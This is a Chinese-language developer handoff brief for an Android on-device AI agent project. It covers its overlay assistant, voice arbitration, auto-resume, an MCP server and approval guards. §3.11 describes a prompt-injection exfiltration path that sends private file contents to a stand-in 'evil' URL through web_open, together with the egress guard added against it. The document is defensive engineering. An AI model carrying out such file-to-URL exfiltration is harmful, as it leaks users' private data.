# 交接简报：从这一页开始

> **⏸ 2026-11-18 暂停**：账号余额将尽，工作停在一个干净的路口。代码全在 `main`、CI 绿。
> **下次回来先看 [`docs/ops/暂停交接-2026-11-18.md`](docs/ops/暂停交接-2026-11-18.md)**
> ——那份是自包含的（冻结快照 / 剩哪三件事 / 环境坑 / 三条验证命令），不依赖聊天记录。

> 写于 **2026-11-13** ｜ 仓库 `Kdkdmwnwdkd/Polaris` ｜ **基线 = 本文档所在的那次提交**
> （不要记 SHA：文档一经更新 SHA 就变。用 `git log -1 --format=%h` 看当前，用 §1 的命令判断它是否健康。）
> 这份文档写给「接手的人或模型」，**不依赖任何聊天记录**。读完这一页就该能开工。

---

## 0. 三十秒版本

**北辰（Polaris）**是一个跑在 Android 手机上的本地 AI Agent：Kotlin + Jetpack Compose，
两个 Gradle 模块（`:core` 内核 / `:app` 界面装配），891 个提交，约 10.3 万行生产代码，
149 个 QA runner。原创实现，参考开源项目只读思路、不抄代码。

**刚做完的三件事**（都在 `main` 上）：

| 提交 | 内容 |
|---|---|
| `a259d09` | 三个可改写接缝 + 工具守卫链（`AgentSeams` / `ToolGuardChain`） |
| `a1e25e4` | 语音仲裁：麦克风占用（`MicClaim`）+ 打断裁决（`InterruptPolicy`） |
| `1939aa2` | 修两处 Android API 在 SDK stub 下的编译差异（CI 用） |
| （本轮） | **后台任务自动续跑**：进程被系统杀掉后，冷启动替用户把上次没做完的接着做完 |

**当前状态**：桌宠一期（悬浮窗）、二期（语音闭环）、三期（一键唤起：磁贴 + 通知按钮）
都已落地。后台任务自动续跑也已落地（判定表在 `core/agent/AutoResumePolicy.kt`，
熔断上限 2 次、窗口 24 小时，设计见 `docs/specs/auto-resume-spec-v1.md`）。
全量 QA 与门禁以 `scripts/qa/run-all.sh` 的当前输出为准。

**下一步**：**真机手测**——按 `docs/qa/真机矩阵-v1.md` 的
**I1–I3**（桌宠审批卡，2026-11-18 新增，最优先）→ **H5**（锁屏拦截）→ P11/P12/P13/P14
里带保留的那几条。代码层面已闭环；**唤醒词仍然建议不做**（spec §12.1 的账：
1–3% 电量/小时 × 未知用量），磁贴是它的替代入口。剩余项的完整清单在
`docs/ops/DEVICE-VERIFICATION-PENDING.md`。

2026-11-17 深夜在一台云 Linux（x86_64 模拟器，API 30）上补跑了一轮端到端：
构建、146 个 runner、桌宠服务 + 悬浮窗 + 通知、对话 → 落盘 → 杀进程 → 回放 → 清空，
全部跑通；并抓到「冷启动必闪退」——`startForegroundService` 的 5 秒窗口撞上首帧渲染，
详见 §3.12。模拟器给不出的仍是省电策略、键盘高度、磁贴添加、ASR 时延。

---

## 1. 上手三条命令

```bash
git clone https://github.com/Kdkdmwnwdkd/Polaris.git && cd Polaris

# ① 全量验证（约 12 分钟，必须看到 FAIL=0）
bash scripts/qa/run-all.sh > /tmp/qa-full.log 2>&1; echo "exit=$?"
grep '^==== 汇总' /tmp/qa-full.log

# ② 门禁（6 项，必须 GATE PASS）
bash scripts/qa/gate.sh /tmp/qa-full.log
```

**判据**：`exit=0`、汇总行 `PASS=147 SKIP=0 XFAIL=0 FAIL=0`、`GATE PASS`。
只要有一条不满足，先修环境（见 §5），**不要**当成「代码坏了」去改代码。

---

## 2. 最近这三轮到底做了什么

### 2.1 三个接缝 + 守卫链（`core/agent/`）

目的：让「用户消息进来」「工具要执行」「助手话说完」这三个点可被外部改写，
而不用去改 1500 行的 `RealAgentLoop`。

| 文件 | 行数 | 要点 |
|---|---|---|
| `ToolGuard.kt` | 151 | `GuardDecision` 只有 `Abstain` / `Deny`，**故意没有 Allow**——守卫只能拦，不能放行，所以「忘写守卫」不会变成安全漏洞 |
| `AgentSeams.kt` | 200 | 用户消息中间件是 waterfall（可短路成 `Handled(reply)`）；助手监听是 parallel（1.5s 上限，异常隔离）；`AgentSeams.NONE` 首行短路零分配 |
| `SeamDeny.kt` | 52 | 被拒绝的调用落成一个正常的 `Completed` 回合，复用既有 `toolMessageOf` / `tool.end` / `settled`，UI 不用改 |
| `RealAgentLoop.kt` | +35 | 纯接线。守卫挂在 **loop 层**而不是 executor 层——executor 是可替换的 |

### 2.2 语音仲裁（`core/voice/` + `app/audio/`）

目的：解决「谁在用麦克风」和「现在能不能打断」，这两件事以前散在各处、各自为政。

| 文件 | 行数 | 要点 |
|---|---|---|
| `MicClaim.kt` | 245 | 单一持有者；优先级 `Capture(3) > Speak(2) > Wake(1)`；`AudioLease` 带单调 id，**释放只认 id 不认持有者**（防迟到释放误伤新持有者）；`ExternalBusy`（别的应用在录音 / 通话中）一票否决但**不算持有者**，只拆 Wake 不拆 Capture |
| `InterruptPolicy.kt` | 176 | 纯函数：`Activity(turnRunning, speaking) × Source(Voice/Text/Wake/Pet)` → `Accept` / `AcceptAfter` / `Reject`，恰好三态。判据：唤醒词的语义是「我在听」不是「重来」，所以不打断有副作用的回合；播报时拒绝唤醒（防自激） |
| `VoiceArbiter.kt` | 207 | Android 侧装配。录音探测用「自己是否持有 Capture」近似排除自己——`AudioManager.getClientUid()` 是 @hide，SDK 里调不到 |
| `TextSpeaker.kt` | +90 | 补 `stop()` 与 `speaking: StateFlow<Boolean>`；按 utteranceId 比对，防 FLUSH 后旧 `onDone` 误判 |

接线改动：`ChatViewModel` +109（`beginVoiceCapture` / `endVoiceCapture` / `send()` 仲裁分支）、
`ChatScreen` +65（语音输入过仲裁、运行中也能发）、`GenerationRunController` +24（`cancelAndWait()`：
裸 `cancel()` 之后 finish 还没跑完，owner/running 仍是旧值）。

### 2.3 两份调研（`docs/research/`）

- `10-agent-mechanisms-2026-11-13.md`：14 个项目的机制库，7 个读过源码，标 `[码]`/`[档]`/`[述]`
- `11-deepseek-harness-2026-11-13.md`：DeepSeek Harness 拆解（Cordis 五概念、五种事件分发、单调守卫、pre-step 不消耗 step）
- `12-on-device-feasibility.md`：16 个项目按「端上 / PC 侧 / 纯桌面」重分类，六条硬约束

---

## 3. 桌宠（一期 11-13 骨架 / 二期 11-14 语音 / 三期 11-14 一键唤起，等真机验证）

**完整设计在 [`docs/specs/desktop-pet-spec-v1.md`](docs/specs/desktop-pet-spec-v1.md)，先读它，别重新设计。**
「开工顺序」保留原文（它解释代码为什么长这样）；一期实现见 §3.3 表 + spec §10，
二期见 §3.6 + spec §11，三期见 §3.7 + spec §12。

### 3.1 目标与验收

让 App 从「打开才存在的助手」变成「一直在桌面上的小东西」：悬浮、可拖、点一下说话、说完会朗读。

**一期验收**（模拟器即可）：能看到桌宠 → 能拖 → 松手吸附屏幕边缘 → 点一下问「现在几点」
→ 拿到回答并听到 TTS → 关掉开关后彻底消失（进程、通知、悬浮窗都不留）。

### 3.2 起步顺序（别跳）

1. **先做「能显示、能拖、能关」**——`PetOverlayService` + `WindowManager` + `ComposeView`。
   这一步只验证一件事：悬浮窗在你目标 ROM 上不被杀。跑通了再往下。
2. **再接 Agent**——`PetAgentSession` 直接实例化 `RealAgentLoop`（先例：`SubAgentRunner.kt:97`
   在无 UI 场景下就是这么起 loop 的）。
3. **最后接语音**——最容易卡住，且最不影响骨架验证。

### 3.3 要新增/改动什么

```
新增  app/.../pet/PetState.kt             开关意图 + 运行态（AppGraph 第 26 条）
      app/.../pet/PetOverlayService.kt    前台服务 + WindowManager（TYPE_APPLICATION_OVERLAY）
      app/.../pet/PetOverlay.kt           ComposeView + 手工挂三个 owner + 拖动吸附
      app/.../pet/PetPanel.kt             形象（位图 + Canvas 叠光晕）+ 气泡 + 输入 + 语音入口
      app/.../pet/PetAgentSession.kt      独立轻量会话（最小只读工具表）
      app/.../pet/PetVoice.kt             语音输入（SpeechRecognizer 直连 + 仲裁 + 超时）
      scripts/qa/run-desktop-pet-verification.sh   39 条守卫（A–H 八段）

改动  AndroidManifest.xml                 注册 service（foregroundServiceType=specialUse）
      app/ui/SettingsScreen.kt            「桌面助手」组：总开关 + 悬浮窗/麦克风引导 + 未运行重试
      app/AgentKitApplication.kt          PetState.sync（只读盘，不启服务）
      app/MainActivity.kt                 onResume 补启动
      app/AppGraph.kt                     登记 PetState
复用  audio/AudioGraph.kt                 取进程级 TTS（`speaker(ctx)`）与仲裁器（`arbiter(ctx)`）；
                                       **不要 new TextSpeaker**，否则桌宠与主界面各有一个引擎，
                                       叠音且「唯一持有者」失效
      core/agent/RealAgentLoop.kt         直接实例化
      core/AppScope.kt                    [io] 上下文
      core/text/SpeechLogic.kt            识别结果清洗（与对话页共用同一套规则）
```

### 3.4 三条必须知道的约束

- **不要复用 `ChatViewModel`**：3625 行、绑 Activity 生命周期。屏幕侧虽然已经被 r14 收窄成
  30 个 `@Stable` 窄接口，但 ViewModel 本身仍活在 Activity 里；悬浮窗活在 Service 里，没有 Activity。
- **桌宠与主界面是两份独立会话历史**。一期不做同步（做同步要多 2 天，还要处理并发写）。
- **`SYSTEM_ALERT_WINDOW` 已声明但无实现**（`AndroidManifest.xml:31`），只需引导用户手动开启，不要新增权限申请。

### 3.5 三个拍板事项的结论（spec §4）

1. **形象**：已定，且**已换过一次**（2026-11-18）。一期是 `PetPanel.kt` 里 Canvas 自绘的
   84dp 方块（零素材，用来先证明窗口能活）；现在是重绘的位图
   `res/drawable-nodpi/pet_avatar_{open,blink}.webp`（384²，各约 28KB），窗口 96dp。
   换形象只动 `PetBody()` 一个 Composable，窗口与状态层没改——一期把它拆出来就是为了这一步。
   细节与取舍见 `docs/ops/桌宠形象-2026-11-18.md`。
2. **唤醒词**：一期二期都**不做**。常驻麦克风约 1–3% 电量/小时，先证明有人用。
3. **历史是否互通**：**不通**。桌宠定位「随手问一句」，历史只在内存里，进程死了就没。

### 3.6 二期语音（2026-11-14 落地）

**手势变了**：长按形象从「弹菜单」改成「开始听」，菜单挪到气泡标题栏的「⋯」。
真机清单 P11-7 已同步改口。理由见 spec §11.3——「长按说话」是最自然的那个动作，
放进二级菜单会让主路径变成三步。

**没有「松手结束」**：说完由引擎的静音判定收尾，句子中间的停顿不会被切断；
想提前结束就点气泡里的麦克风（toggle）。第一版写成「按住说话、松手结束」，
被 CI 拦下——Compose 的 `AwaitPointerEventScope` 是 `@RestrictsSuspension` 的，
`awaitEachGesture` 里不能调 `coroutineScope`/`launch`/`delay`，也就起不了计时器、
拿不到抬手事件。这一条值得记住，它看起来完全能编译。

**四个必须知道的约束**（都在 `PetVoice.kt` 的类注释里）：

1. **状态只在主线程改**。录音线程（`asr-capture`）的回调一律 `handler.post` 回主线程，
   再动 Compose 状态与 `onText`。
2. **一次只有一个会话，用完就拆**。`active` 之外再按一次直接忽略；`LocalSpeechInput`
   每次新建、收尾即 `cancel()`，不复用。
3. **必须有超时**。20s 硬上限（`HARD_TIMEOUT_MS`），录音层另有 30s 上限
   （`LocalSpeechInput.MAX_MS`）。`stop()` 之后**没有**另设「等结果」的宽限——收尾只等
   一次 decode。（原文写的是「20s 硬上限 + 5s 结果等待」，那是 11-14 系统识别器版本的账；
   11-16 删掉那条路时，宽限也跟着没了。）
4. **必须走仲裁**。`beginCapture` 成功即意味着播报已停——不要自己先调 `stopSpeech()`，
   互斥是仲裁的结果，不是调用方的义务。

**没有做 whisper**。原计划「快路失败回落 whisper.cpp（tiny 75 MB）」，实际没做：
NDK 编译会让 24 分钟的 CI 翻倍，APK 从 35 MB 涨到 110 MB，而收益只覆盖「没有识别服务」
和「无网络」两种场景。回落点留在 `PetVoiceInput.start()` 里 `isRecognitionAvailable` 那个分支上，
将来要做只换那一处。

**一个将来必踩的坑**：`targetSdk = 28` 时 Android 14 的「前台服务类型必须匹配能力」检查
不生效，所以 `specialUse` 却录音不会崩。**一旦 targetSdk 提到 34**，必须改 manifest 的
`specialUse|microphone` + 动态 type（无 `RECORD_AUDIO` 时不能带 microphone 位，
否则抛 `SecurityException`）。完整写法见 spec §11.5。

### 3.7 三期「一键唤起」（2026-11-14 落地，替代唤醒词）

**唤醒词没做，而且建议继续不做。** 账很简单：常驻麦克风 + 关键词检测 1–3% 电量/小时，
模型给 APK 加 42 MB（Vosk 中文）或要自己训练（Porcupine 中文词），还要解决麦克风独占；
换来的只是「不用点两下」。真实用量为零之前，这笔投入注定是负资产。

**替代方案**：把「叫它出来」摊到三个入口——桌面上的小球（一期就有）、
通知栏的「说一句」、快捷设置的「北辰」磁贴。零常驻、零新权限、零依赖。

关键实现四处：

| 位置 | 做了什么 | 为什么不能省 |
|---|---|---|
| `PetTileService` | 磁贴；锁屏走 `unlockAndRun` | 锁屏上直接开麦等于绕过用户确认 |
| `PetOverlayService.ACTION_LISTEN` | 唯一入口，`listen()` 统一收口 | 三条入口各自拼启动逻辑迟早分叉 |
| `PetState.start(ctx, action)` | action 随启动意图一起下去 | 先 start 再补一条 intent，中间服务可能已自退 |
| `PetOverlayHost.beginVoice()` | 空闲→展开+听；在听→收尾 | 语义与气泡里的麦克风按钮完全一致 |

**三个「看起来做了、其实没做」的坑**（守卫 `[I]` 段 12 条钉住）：

1. **只把桌宠叫出来、没开始听**（I8）。漏传 action 时磁贴会把小球叫到桌面上，
   然后一声不响地等着——用户张着嘴以为坏了。
2. **系统重建服务时偷偷开麦**（I7b）。`START_STICKY` 重建的 `intent` 是 null，
   若在 `onCreate` 里无条件 `beginVoice()`，用户从没点过任何东西也会开始录音。
3. **展开就弹键盘**（I10）。二期那句「`LaunchedEffect(Unit)` 只跑一次不会抢焦点」是错的：
   收起态压根不组合 `BubbleCard`，展开是全新组合。现在由 `autoFocusInput` 受控。

**一个刻意的设计**：关掉桌宠开关后点磁贴会把它重新打开。磁贴的语义是「叫它出来」，
不是「开关」。想彻底安静，把磁贴从面板上移除。

### 3.8 自动续跑（2026-11-14 落地）

`AgentRunService` 早就有了，但它只防「系统回收」，防不了「进程真被杀」。
被杀之后旧行为是「不失忆，但也不自己动」：落盘运行态、冷启动对账、续跑上下文、
孤儿调用提示全都有，**只差最后一步没人推**——用户得自己打两个字「继续」。

现在冷启动会**替用户发这句「继续」**。关键设计：

| 位置 | 做了什么 | 为什么不能省 |
|---|---|---|
| `core/agent/AutoResumePolicy.kt` | 判定表：11 种理由 → 三态（跑 / 只提示 / 静默） | 每次判定都对应一次真实请求；纯函数才能被 harness 逐条断言 |
| `ChatViewModel.autoResumeIfPossible` | 取状态 → 裁决 → 代发「继续」 | 复用 `send()`，续跑上下文/历史/前台服务/落盘/打断仲裁一个都不用重写 |
| `runStateReady`（Deferred） | 把「对账结论」从第 991 行的 init 搬到类体末尾那个 init | 前者跑在 IO 线程，会读到还没初始化的 `_activeConversationId`——2026-11-09 模拟器 NPE 就是这么来的 |
| `AgentRunState.autoResumeAttempts` | 熔断计数，随状态落盘 | 不落盘则每次冷启动归零，「一跑就被杀」的任务会被无限自动重试 |

**两个必须记住的性质**：

1. **它是重放，不是恢复执行栈。** 进程死了，协程的函数帧早就没了；能恢复的只有
   已落盘的对话历史。所以它**可能重复已完成的副作用**——靠既有的 R1 孤儿调用提示兜底
   （那段提示会照样注入这一轮，因为走的同一个 `send()`）。
2. **只在当前会话自动跑**，不自动切会话；没有模型、会话被删、中断超过 24 小时都不跑，
   只给一句说明为什么。

验证：`scripts/qa/run-auto-resume-verification.sh`（11 条结构 + 39 条行为，
含端到端模拟「续跑→被杀→再续跑」两轮后第三轮必须停手）。
真机三条见 `docs/ops/DEVICE-VERIFICATION-PENDING.md` 的 P14——它们只验**触发时机**。

### 3.9 收尾三处（2026-11-17 修）

真机验证前先把「不会崩、但用户会觉得功能坏了」的三处收掉。守卫在
`run-desktop-pet-verification.sh` 的 `[J]` 段（J1–J5，含反向变异验过）：

| 现象 | 根因 | 修法 |
|---|---|---|
| 关掉桌宠，回答还在念 | `hide()` 只拆窗、`scope.cancel()`；TTS 是进程级单例，已经交给引擎的音频停不下 | `hide()` 里 `AudioGraph.arbiter(context).stopSpeech()`（顺带释放播报租约） |
| 设置页说「运行中」，屏幕什么都没有 | `show()` 无返回值，`addView` 失败只打日志；服务照样 `markRunning(true)` | `show(): Boolean`；服务只在 true 时报运行态，失败即 `stopSelf()` |
| 转个屏桌宠就找不回来 | 窗口坐标是绝对像素，`screenSize()` 只在 show / 拖动时读 | Service 重写 `onConfigurationChanged` → `PetOverlayHost.onScreenChanged()` 按新尺寸重新贴边 |

三条都不改分层边界（`arch-baseline` 未动）。第三条只在旋转 / 折叠场景出现，但出现就等于
丢功能——服务还在跑、通知还在，磁贴再点也只是「服务已经在跑」。

### 3.10 架构方案 P0 落地（2026-11-17）

`docs/architecture/AICoding-架构方案-v3-2026-11-17.md` 的 P0「止血」五项全部落地。
共同点：**都落在既有文件内，不新增模块，`arch-baseline` 不动**。

| # | 动作 | 落点 | 守卫 |
|---|---|---|---|
| 1 | 接缝真接上：`productionSeams` 从零调用变成主界面 + 桌宠各一处 | `ChatViewModel`（loop 的 `seams=`）、`PetAgentSession` | `run-agent-seams-verification.sh` A8–A10 |
| 2 | 审批预览与判定同源（`take(500)` → 保头保尾 2000 字符） | `core/agent/ApprovalPreview.kt`、`ChatViewModel.requestApproval` | E1–E3（行为） |
| 3 | 出站守卫 `EgressGuard`：本回合读过文件/屏幕/shell 后，`web_search` 必须人确认 | `core/agent/EgressGuard.kt` | D1–D7（行为） |
| 4 | 主界面朗读并入 `AudioGraph.arbiter`（原来自建第二个 `TextToSpeech`） | `ChatScreen.TtsController` | `run-voice-arbiter-verification.sh` A17–A18 |
| 5 | 桌宠「停」+ 关闭保留会话 | `PetPanel`、`PetOverlayHost`、`PetConversation.kt` | `run-desktop-pet-verification.sh` K1–K5 |

**三个取舍，写清楚免得后人重踩：**

1. **`http_request` 不进出站守卫。** 它自己 `needsApproval = true` 且按域名记忆；再加一道
   只会让同一个动作连弹两个一模一样的「网络请求」窗。重复确认训练用户无脑点允许，比不确认更危险。
   真正的盲区（已允许域名 + 本回合读过私有内容）留给 P1 的 `Consent`——让审批弹窗带上下文，
   而不是加第二道同样的门。
2. **`web_search` 归到 `Approval.NETWORK`。** 它原来没标归组，弹窗文案会回落成
   「本次会话不再询问web_search」（`ApprovalGrouping.labelOf` 的保守回退）。EgressGuard 的
   确认框正好走这条归组，不修的话用户看不懂自己在同意什么。
3. **守卫自己声明超时。** 链默认 3 秒，而「问用户」的守卫必须等得比弹窗久（`EgressGuard` 60 秒）。
   为此给 `ToolGuard` 加了 `timeoutMs` 与 `onTurnStart`（回合边界清账），链按每个守卫自己的
   值计时。`onTurnStart` 由 `RealAgentLoop` 在回合入口统一调——用时间窗口或调用序号猜边界，
   在长回合 / 并行工具下都会错。

**本机验证账**（`QA_GRADLE_CACHE` 里备了 2.2.21 的编译器构件）：

- 全绿：`run-agent-seams`（49）、`run-desktop-pet`（75）、`run-voice-arbiter`（43）、
  `run-pet-history`（24）、`run-approval-tier`（22）、`run-private-read-approval`（30）、
  `run-shell-read-boundary`（31）
- 反向变异：删 `tainted.set(true)` → D2/D3/D4 红；删 `job?.cancel()` → K2 红；
  会话改回 `new` → K4 红；TtsController 改回自建引擎 → A17/A18 红；
  预览改回 `take(limit)` → E2/E3 红；恢复挪到取快照之后 → L2 红；清空只清内存 → L4 红；
  全部恢复后回绿
- 断言普查：1729 条，未超基线（新断言全是行为断言，`AgentSeamsVerification.kt` 的文本断言 2 → 0）
- 本机仍跑不动的：用 `kotlinc` CLI 的那批（`run-r13-catalog`、`run-approval-grouping` 等），
  机器上没有 `/tmp/kotlinc`——与改动无关，交 CI

### 3.11 五项「都要做」的落地（2026-11-17 晚）

用户在拍板时选了「都要做，往最好的方面做」。五项里三项能写代码，两项只能落地成资产。

| # | 事项 | 落地 | 守卫 |
|---|---|---|---|
| 1 | 桌宠历史落盘 | `pet/PetHistoryStore.kt` + `PetAgentSession` 恢复/保存 + 菜单「清空对话」 | `run-desktop-pet` L0–L9d、`run-pet-history` C1–C6 |
| 2 | 外发确认档位 | 定「每次问」并锁死：`EgressGuard.taintedNow` → `requestApproval` 降级为不可记忆 | `run-agent-seams` C1–C5 |
| 3 | P1 期间暂停新功能 | `docs/architecture/P1-冻结令-2026-11-17.md` + `AGENTS.md` 置顶 | 人读（无法自动判「加功能」） |
| 4 | 真机矩阵 | `docs/qa/真机矩阵-v1.md`（41 条）+ `scripts/qa/device/matrix.sh` | 脚本自身；无设备时退 2 并打 `COVERAGE INCOMPLETE` |
| 5 | 吊销泄漏的 PAT | 仓库与 869 个提交全扫：**0 条真 token**（只有测试假串）；仓库侧开 Dependabot、清误报告警 | 手工（撤销在用户账号里） |

**第 2 项为什么不是「加个设置项让用户选 5 分钟免问」**：那正是原方案里列的第二个选项，
但它把「要不要把内容发出去」变成一个**可以被记住**的决定，而提示注入的全部技巧就是让用户
在错误的语境下点一次「允许」。所以选每次问，并且把这条决定写进代码：本回合读过私有内容后，
`http_request` 的逐域记忆也失效（三档 + 会话白名单 + 截图缓存全绕过）。

**顺手补的真漏洞**：`DEFAULT_EGRESS_TOOLS` 原来只有 `web_search`，而 `web_open` / `web_eval` /
`web_click` / `web_type` 在 `ToolCatalog` 里**都免审批**。也就是
`read_file(私密文件) → web_open("https://evil/?d=" + 内容)` 全程零弹窗。四个工具已补进集合；
`http_request` 刻意不加（它有自己的逐域审批，重复弹窗是负价值）。

**第 1 项的两个边界**（后人改之前先看）：
- 只存 user/assistant 的**文本**，不存 tool 轨迹：残缺的 `tool_calls` 配对会让下一轮请求直接 400。
- 上限与内存同源（`MAX_HISTORY = PetHistoryStore.MAX_MESSAGES`）：存得比模型记得多，用户会看到
  一段模型「不认」的对话。

### 3.12 云机实测：抓到冷启动闪退（2026-11-17 深夜）

在一台 4 vCPU / 8 GB 的云 Linux（Debian 13、JDK 21、Android SDK 34、system-image
android-30）上把整条链路跑了一遍。该机没有嵌套虚拟化（`/dev/kvm` 节点在、打不开），
模拟器用 `-accel off` 纯软件跑，慢但可用。

**抓到的真 bug：冷启动必闪退。**

```
android.app.RemoteServiceException: Context.startForegroundService()
  did not then call Service.startForeground()
```

`PetOverlayService.onCreate` 第一句就是 `startForeground`，所以「漏调」是误读。真因是
**服务没被创建**：`MainActivity.onResume → ensureRunning → startForegroundService`，
而主线程接下来要跑 Compose 首帧的测量/布局/绘制，`handleCreateService` 排在队列后面。
那 5 秒窗口由系统从调用瞬间计时，超时在 `ActivityThread` 里抛——**在我们的调用栈之外**，
`runCatching` 抓不住，整个进程被判死。用户看到的是「一进 App 就闪退」。

修法（`PetState`）：
- `ensureRunning`（只在前台 `onResume` 调用）改用 `startService`，不参与 5 秒窗口；
  服务照样在 `onCreate` 里 `startForeground`，仍是前台服务。
- `start(background = true)`（磁贴 / 通知按钮，可能在后台）保留 `startForegroundService`。
- 守卫 `B3` / `B4` 把这层区分钉住：谁把它改回一条路径，哪一半就会坏。

这段为什么 CI 抓不到：146 个 runner 全是静态断言与 JVM 逻辑，没有一个能制造「主线程忙
5 秒」这个条件。

**`matrix.sh` 自己也修了 7 处**（第一次在真设备上跑就现原形）：

| 缺陷 | 表现 | 修法 |
|---|---|---|
| `adb -s X getprop` 少了 `shell` | 报告标题变成 `adb: unknown command getprop` | 补 `shell` |
| install 走 20 秒超时 | 26 MB 包没装完就被掐，判「安装失败」 | 单独 300 秒 + 认 `Success` |
| A3/A8/C4 空转判 PASS | 服务没起时也报 4 个 PASS | 前提不成立一律 SKIP |
| 「已装版本」写在表头之后 | Markdown 表格被劈开 | 移到表头之前 |
| release 包 `run-as` 失败判 FAIL | 只跟打包类型有关，被记成产品缺陷 | 认 `not debuggable` 等文本 → SKIP |
| A8 数 channel 名 | channel 在 dumpsys 里天然出现 3 次，正常服务被判「重复通知」 | 改数 `NotificationRecord` |
| 依赖 `awk` | 在没 awk 的机器上表现成「永远没有设备」 | 改 `sed` |

还有一条：一轮全是 SKIP 时脚本原本 exit 0，会被下游读成「AUTO 全过」。现在 exit 2 并在
报告里写 `INCOMPLETE`。

**跑通的端到端**（全部有 `adb` 证据）：设置页开开关 → 前台服务 + 通知 + 悬浮窗 →
气泡输入 → mock LLM（`10.0.2.2:8200`）回一句 → `files/pet/history.json` 落盘 →
`am force-stop` 重开 → 气泡回放上一轮（时间戳前缀已剥）→ 菜单「清空对话」→ 文件被删。

**仍然是 INCOMPLETE 的部分**：省电策略、键盘高度、磁贴添加、ASR 真机时延、拖动吸附手感。
模拟器给不出这些，也不会因为它们没验就变成「通过」。

---

### 3.13 MCP 对外提供（M1 只读桥，2026-11-18 凌晨）

先查了手机端 DSH 生态：开源有 20+ 个项目在做「把 DSH 装进手机」，最省的是
`jackwener/DSH-Android`（Node 24 编成 `.so`，110 MB 包），最完整的是 `DSH-APP/DSHA`
（内置 Ubuntu rootfs，1 GB）。它们的共同代价是**把 Node 搬进手机**，共同短板是
**真机控制**（只能靠无障碍 + Shizuku/ADB 硬凑）。

所以方向反过来：**把手机的工具按 MCP 暴露出去**，让那些客户端连上来把 Polaris 当手。
体积零增长，且补的正是它们缺的那块。

**落地内容**

| 层 | 文件 | 要点 |
|---|---|---|
| 协议 | `core/mcp/server/McpServerHost.kt` | 手写 HTTP/1.1（只认 `POST /mcp`）+ JSON-RPC；**零新增依赖**，不引 NanoHTTPD |
| 档位 | `McpTier.kt` | readonly / standard / full 只决定**可见性**；审批由 `needsApprovalFor` 单独判 |
| 配对 | `McpPairing.kt` | 每客户端独立 token，只存 SHA-256；爆破 10 次降级 |
| 审计 | `McpAudit.kt` | JSONL，参数只存摘要 + 前 200 字符；7 天滚动 |
| 装配 | `app/mcp/McpToolset.kt` | 7 个工具：`app_list`/`ui_tree`/`read_file`/`memory_search`/`knowledge_search`/`calculator` + `app_launch` |
| 服务 | `McpHostService.kt` | 前台 `dataSync`；入口用 `startService`（避开 5 秒窗口，同 §3.12 的教训） |
| 入口 | `McpScreen` 顶部「对外提供」卡片 | 开关 / 档位 / 生成令牌 / 撤销 |

**两个不能让步的决定**

1. **没有审批界面就拒绝。** `approver == null` 时，`needsApprovalFor` 为真的调用一律
   `-32004`。绝不能因为「是外部调用、没人看见」就放行——那正是 `dsh-purge` 拆宿主拦截面
   的同一条路。
2. **档位 ≠ 审批。** 档位放宽只是「工具可见」，`write_file` 在标准档里照样要弹卡。
   把两者合成一个维度，结果必然是「为了少弹窗放宽档位」，再也收不回。
3. **不在场 = 拒绝。** `screenOn` 由宿主注入（core 不能 import android），非 `SAFE`
   一律 `-32006`。判据是 **`isInteractive && !isKeyguardLocked`**，不是只看亮屏：
   锁屏界面本身就是亮着的 Activity，只判 `isInteractive` 等于给锁屏开了后门。

**为什么 MCP 层不吃 `ToolRegistry`**

`ToolRegistry.descriptors()` 用 `JsonSchema.serializer()`，要序列化编译器插件。
把它拖进 harness，会让行为测试在没装插件的机器上编不过 → 被 SKIP → 「被拒的调用
一次都没执行」这种安全断言**静默消失**。改成 `McpToolSource` 四个方法后，harness
只编 8 个源文件就能真跑。

**验证**：`scripts/qa/run-mcp-host-verification.sh`，9 条装配 + 27 条行为断言全绿。
其中 B11/B13 是核心：「被档位拒绝的调用，工具执行计数一次都没涨」。

**首轮 CI 红了两处，都是真问题**（不是门禁误报）：

| 门禁 | 症状 | 根因 | 改法 |
|---|---|---|---|
| S4 无 JSON 硬转换 | `McpServerHost` 用了 `?.jsonObject` | 与 hotfix33 同一类：`JsonNull` 上硬转抛异常。客户端发 `{"params":null}`（规范允许）会 500 而不是 `-32600` | 换 `objOrNull()` / `primOrNull()` |
| assertion-census | 新 harness 带 15 条文本断言 | `body.contains("-32003")` 只证明「这个子串出现过」，`-3200` 也能过 | 解析 JSON 取 `error.code` 做整数比较；`tools/list` 取名字集合做集合相等 |

副作用是断言变强了：B4 从「看到 `read_file`」变成「只读档**恰好**是
`{read_file, calculator}`」，多泄漏一个工具立刻红。

**没做（M2）**：审批卡片、DANGEROUS 工具、局域网/TLS、真实 `ToolGuardChain` 装配。

**两个已知的行为缺口**（不构成安全问题，但会让人困惑）：

| 现象 | 原因 | 怎么修（M2） |
|---|---|---|
| 服务被系统杀掉重建后，档位回落到「只读」 | `START_STICKY` 重建时 `intent == null`，`tier` 取默认值。降权方向是安全的（收紧而非放宽），但用户会以为「我明明选了标准档」 | 把 tier 落 SharedPreferences，重建时读回 |
| 重建后端口变了 | `McpHostConfig.port = 0` 由系统分配 | 配好固定端口（需先做「端口被占」的重试与提示） |

这两条都不该现在改：M1 的用途是只读观察，档位与端口变化只影响便利性。
但 M2 做审批卡时必须一起解决——那时用户会真的依赖「标准档 + 弹卡」这条路。

### 3.14 Consent 契约（P1-3 第一版，2026-11-18）

M1 收尾时留下的判断是：**MCP 的审批卡不该单独做**——它会成为第五份审批实现
（主界面一套、桌宠一套、子代理一套、技能一套，再加 MCP 一套）。
查 P1 冻结令，解冻条件第 2 条正是「`Consent` / `ToolSource` / `CapabilitySpec`
三个契约有第一版实现」。所以先做契约，M2 的卡以后者的身份接进来。

**修的是什么**：`ToolApproval?` 里的 `null` 同时表示「这条通道没有弹窗位置」和
「忘了传」。审计 F4 已把运行期改成拒绝，但**表达**层的歧义还在——读者无法从类型上
判断一个 `null` 是设计还是疏忽。

**为什么没选「必填参数」**：全仓 96 处 `RealAgentLoop(` + 11 处 `RegistryToolExecutor(`，
绝大多数是 harness 的「我只想测工具执行」。改成必填得到 107 行噪声，判别力为零。
改成三层：类型（`null` 不可表达、`Deny` 必须带理由）+ 默认值（`Consent.unset`，方向是关）
+ 门禁（A4 盯四个生产入口）。

**顺手把裁决也搬进契约**：原先 try/catch 在 `RegistryToolExecutor` 里，后果是
「取消不是拒绝」只有执行器知道，且执行器牵 `ToolRegistry`（要序列化编译器插件）
→ 行为断言会 SKIP 掉。搬进 `Consent.decide` 后，三个源文件就能真编真跑。

| 入口 | 现在写什么 |
|---|---|
| 主界面 / 子代理 | `Consent.ask { … }` |
| 桌宠 | `Consent.ask { … PetApproval.ask(…) }`（第二阶段，见 §3.15） |
